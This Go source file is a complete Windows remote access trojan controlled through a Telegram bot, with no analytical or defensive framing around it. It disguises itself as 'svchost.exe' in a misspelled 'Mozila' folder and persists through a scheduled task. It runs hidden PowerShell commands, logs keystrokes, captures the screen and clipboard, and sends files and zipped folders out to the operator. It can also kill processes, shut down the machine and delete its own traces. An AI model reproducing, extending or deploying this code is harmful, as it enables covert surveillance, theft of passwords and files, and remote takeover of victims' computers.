package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// --- CONFIGURATION ---
const (
	BotToken    = "Bottoken"
	AuthID      = telegramID
	TaskName    = "SheIIHost"
	InstallName = "svchost.exe"
	FolderName  = "Mozila"
)

// --- GLOBAL VARIABLES ---
var (
	isLogging  bool
	tempFolder string
	user32     = syscall.NewLazyDLL("user32.dll")
	procAsync  = user32.NewProc("GetAsyncKeyState")
	procKeybd  = user32.NewProc("keybd_event")
)

// --- HELPER FUNCTIONS ---

func RunSilent(command string) {
	cmd := exec.Command("cmd", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func IsAuthorized(update tgbotapi.Update) bool {
	if update.Message.From.ID != AuthID {
		return false
	}
	return true
}

// InstallSelf: Cleans Registry (Visible) and uses Simplified Task Scheduler (Invisible in Startup Tab)
func InstallSelf() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	
	appData, err := os.UserConfigDir()
	if err != nil || appData == "" {
		appData = os.Getenv("APPDATA")
	}

	installDir := filepath.Join(appData, FolderName)
	targetPath := filepath.Join(installDir, InstallName)

	// 1. If running from install folder, set up persistence
	if strings.EqualFold(exePath, targetPath) {
		
		// Clean up the "Visible" Registry Key (if it exists)
		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", TaskName, "/f").Run()

		// Create Task Scheduler Task (Without -Hidden to avoid Access Denied)
		psCmd := fmt.Sprintf(`
		$A = New-ScheduledTaskAction -Execute '%s';
		$T = New-ScheduledTaskTrigger -AtLogOn;
		$S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;
		Unregister-ScheduledTask -TaskName '%s' -Confirm:$false -ErrorAction SilentlyContinue;
		Register-ScheduledTask -TaskName '%s' -Action $A -Trigger $T -Settings $S;
		`, targetPath, TaskName, TaskName)

		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
		
		return
	}

	// 2. Otherwise, Install (Copy files)
	os.MkdirAll(installDir, 0755)

	input, err := ioutil.ReadFile(exePath)
	if err == nil {
		ioutil.WriteFile(targetPath, input, 0777)
	} else {
		return 
	}

	// 3. Launch the new instance
	newCmd := exec.Command(targetPath)
	newCmd.Start()

	// 4. Kill this installer instance
	os.Exit(0)
}

// --- FEATURES ---

func KeyloggerLoop() {
	logPath := filepath.Join(tempFolder, "dat.txt")
	for isLogging {
		time.Sleep(10 * time.Millisecond)
		for key := 8; key <= 190; key++ {
			val, _, _ := procAsync.Call(uintptr(key))
			if val&0x8000 != 0 { 
				char := ""
				switch key {
				case 13: char = "\n"
				case 32: char = " "
				case 8: char = "[BACK]"
				default:
					if key >= 65 && key <= 90 { char = string(rune(key)) }
					if key >= 48 && key <= 57 { char = string(rune(key)) }
				}
				if char != "" {
					f, _ := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
					f.WriteString(char)
					f.Close()
					time.Sleep(150 * time.Millisecond)
				}
			}
		}
	}
}

func MinimizeAll() {
	const VK_LWIN = 0x5B
	const KEYEVENTF_KEYUP = 0x0002
	procKeybd.Call(uintptr(VK_LWIN), 0, 0, 0)
	procKeybd.Call(uintptr('D'), 0, 0, 0)
	procKeybd.Call(uintptr('D'), 0, KEYEVENTF_KEYUP, 0)
	procKeybd.Call(uintptr(VK_LWIN), 0, KEYEVENTF_KEYUP, 0)
}

// --- MAIN ---

func main() {
	InstallSelf()
	tempFolder = os.TempDir()

	bot, err := tgbotapi.NewBotAPI(BotToken)
	if err != nil {
		time.Sleep(30 * time.Second) 
		return 
	}

	// --- STARTUP SIGNAL ---
	hostname, _ := os.Hostname()
	startMsg := tgbotapi.NewMessage(int64(AuthID), "[+] Bot is ONLINE!\nHost: "+hostname)
	bot.Send(startMsg)
	// ----------------------

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil || !IsAuthorized(update) {
			continue
		}

		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
		text := update.Message.Text
		chatID := update.Message.Chat.ID

		switch {
		
		case strings.HasPrefix(text, "/start"):
			msg.Text = "COMMANDS:\n/powershell <cmd>\n/dir\n/cd <path>\n/download <path>\n/keylog\n/keylogstop\n/scr\n/process\n/processkill <pid>\n/run <path>\n/clipboard <opt>\n/collapse\n/off\n/selfdestruct"
			bot.Send(msg)

		// --- NEW: SELF DESTRUCT ---
		case strings.HasPrefix(text, "/selfdestruct"):
			bot.Send(tgbotapi.NewMessage(chatID, "[!] Self-destruct initiated. Removing persistence and deleting files... Goodbye."))

			// 1. Remove Task Scheduler entry
			psCmd := fmt.Sprintf("Unregister-ScheduledTask -TaskName '%s' -Confirm:$false -ErrorAction SilentlyContinue", TaskName)
			exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd).Run()

			// 2. Remove Registry entry (just in case)
			exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", TaskName, "/f").Run()

			// 3. Spawn a delayed CMD process to delete the folder AFTER the bot exits
			appData, _ := os.UserConfigDir()
			if appData == "" {
				appData = os.Getenv("APPDATA")
			}
			installDir := filepath.Join(appData, FolderName)
			
			// ping localhost for 3 seconds as a delay, then forcefully remove the directory
			deleteCmd := fmt.Sprintf("ping 127.0.0.1 -n 3 > nul & rmdir /s /q \"%s\"", installDir)
			cmd := exec.Command("cmd", "/C", deleteCmd)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Start()

			// 4. Terminate the bot immediately so the file unlocks
			os.Exit(0)

		case strings.HasPrefix(text, "/powershell "):
			cmdStr := text[12:]
			bot.Send(tgbotapi.NewMessage(chatID, "[~] Running (15s Timeout)..."))
			
			scriptPath := filepath.Join(tempFolder, "run.ps1")
			ioutil.WriteFile(scriptPath, []byte(cmdStr), 0777)

			ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
			defer cancel() 

			cmd := exec.CommandContext(ctx, "powershell", "-nologo", "-noprofile", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

			output, err := cmd.CombinedOutput()
			outputStr := string(output)

			if ctx.Err() == context.DeadlineExceeded {
				bot.Send(tgbotapi.NewMessage(chatID, "[!] Timeout (15s). Process killed."))
			} else {
				if len(outputStr) > 0 {
					outPath := filepath.Join(tempFolder, "ps_out.txt")
					ioutil.WriteFile(outPath, output, 0777)
					doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(outPath))
					bot.Send(doc)
					time.Sleep(1 * time.Second)
					os.Remove(outPath)
				} else {
					if err != nil {
						bot.Send(tgbotapi.NewMessage(chatID, "Error: "+err.Error()))
					} else {
						bot.Send(tgbotapi.NewMessage(chatID, "[~] Executed (No output)."))
					}
				}
			}
			os.Remove(scriptPath)

		case strings.HasPrefix(text, "/run "):
			path := strings.TrimSpace(text[5:])
			if _, err := os.Stat(path); os.IsNotExist(err) {
				bot.Send(tgbotapi.NewMessage(chatID, "[!] File does not exist.\nCheck path: "+path))
			} else {
				bot.Send(tgbotapi.NewMessage(chatID, "[*] Launching..."))
				cmd := exec.Command("cmd", "/C", "start", "\"\"", path)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				err := cmd.Start()
				if err != nil {
					bot.Send(tgbotapi.NewMessage(chatID, "[!] Launch Error: "+err.Error()))
				}
			}

		case strings.HasPrefix(text, "/dir"):
			dir, _ := os.Getwd()
			files, _ := ioutil.ReadDir(dir)
			out := "Loc: " + dir + "\n\n"
			for _, f := range files {
				if f.IsDir() {
					out += "[DIR] " + f.Name() + "\n"
				} else {
					out += "[FILE] " + f.Name() + "\n"
				}
			}
			if len(out) > 4000 { out = out[:4000] + "..." }
			msg.Text = out
			bot.Send(msg)

		case strings.HasPrefix(text, "/cd "):
			path := strings.TrimSpace(text[4:])
			err := os.Chdir(path)
			if err == nil {
				msg.Text = "[+] Changed: " + path
			} else {
				msg.Text = "[!] Invalid path."
			}
			bot.Send(msg)

		case strings.HasPrefix(text, "/download "):
			target := strings.TrimSpace(text[10:])
			info, err := os.Stat(target)
			if err != nil {
				msg.Text = "[!] Not found."
				bot.Send(msg)
			} else {
				if info.IsDir() {
					bot.Send(tgbotapi.NewMessage(chatID, "[...] Zipping..."))
					zipPath := filepath.Join(tempFolder, "archive.zip")
					absPath, _ := filepath.Abs(target)
					psCmd := fmt.Sprintf("Compress-Archive -LiteralPath '%s' -DestinationPath '%s' -Force", absPath, zipPath)
					cmd := exec.Command("powershell", "-Command", psCmd)
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
					
					doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(zipPath))
					bot.Send(doc)
					time.Sleep(2 * time.Second)
					os.Remove(zipPath)
				} else {
					bot.Send(tgbotapi.NewMessage(chatID, "[^] Uploading..."))
					doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(target))
					bot.Send(doc)
				}
			}

		case strings.HasPrefix(text, "/keylog"):
			if strings.HasPrefix(text, "/keylogstop") {
				isLogging = false
				time.Sleep(500 * time.Millisecond)
				logPath := filepath.Join(tempFolder, "dat.txt")
				if _, err := os.Stat(logPath); err == nil {
					doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(logPath))
					bot.Send(doc)
					time.Sleep(time.Second)
					os.Remove(logPath)
				} else {
					bot.Send(tgbotapi.NewMessage(chatID, "[-] No logs."))
				}
			} else {
				if !isLogging {
					isLogging = true
					go KeyloggerLoop()
					bot.Send(tgbotapi.NewMessage(chatID, "[+] Started."))
				} else {
					bot.Send(tgbotapi.NewMessage(chatID, "[!] Already running."))
				}
			}

		case strings.HasPrefix(text, "/scr"):
			bot.Send(tgbotapi.NewMessage(chatID, "[*] Capturing..."))
			scPath := filepath.Join(tempFolder, "sc.png")
			psCmd := fmt.Sprintf("Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size); $bmp.Save('%s');", scPath)
			cmd := exec.Command("powershell", "-Command", psCmd)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Run()

			time.Sleep(2 * time.Second)
			photo := tgbotapi.NewPhoto(chatID, tgbotapi.FilePath(scPath))
			bot.Send(photo)
			time.Sleep(time.Second)
			os.Remove(scPath)

		case strings.HasPrefix(text, "/process"):
			if strings.HasPrefix(text, "/processkill ") {
				arg := strings.TrimSpace(text[13:])
				if len(arg) > 0 {
					argStr := "/IM"
					if _, err := strconv.Atoi(arg); err == nil { argStr = "/PID" }
					RunSilent("taskkill /F " + argStr + " " + arg)
					bot.Send(tgbotapi.NewMessage(chatID, "[!] Killed."))
				} else {
					bot.Send(tgbotapi.NewMessage(chatID, "Usage: /processkill <PID/Name>"))
				}
			} else {
				out := "Loc: " + tempFolder
				cmd := exec.Command("tasklist")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				output, _ := cmd.CombinedOutput()
				out = string(output)
				
				procPath := filepath.Join(tempFolder, "proc.txt")
				ioutil.WriteFile(procPath, []byte(out), 0777)
				bot.Send(tgbotapi.NewDocument(chatID, tgbotapi.FilePath(procPath)))
				time.Sleep(time.Second)
				os.Remove(procPath)
			}

		case strings.HasPrefix(text, "/clipboard"):
			cmd := exec.Command("powershell", "-NoProfile", "Get-Clipboard")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			outBytes, _ := cmd.CombinedOutput()
			out := string(outBytes)

			if len(text) > 11 {
				newText := text[11:]
				newText = strings.ReplaceAll(newText, "'", "''")
				setCmd := fmt.Sprintf("Set-Clipboard -Value '%s'", newText)
				exec.Command("powershell", "-NoProfile", "-Command", setCmd).Run()
				bot.Send(tgbotapi.NewMessage(chatID, "[+] Updated. Old:\n" + out))
			} else {
				if strings.TrimSpace(out) == "" { out = "(Empty or Image)" }
				bot.Send(tgbotapi.NewMessage(chatID, "[Clipboard]:\n" + out))
			}

		case strings.HasPrefix(text, "/collapse"):
			MinimizeAll()
			bot.Send(tgbotapi.NewMessage(chatID, "[*] Done."))

		case strings.HasPrefix(text, "/off"):
			RunSilent("shutdown /s /t 0")
		}
	}
}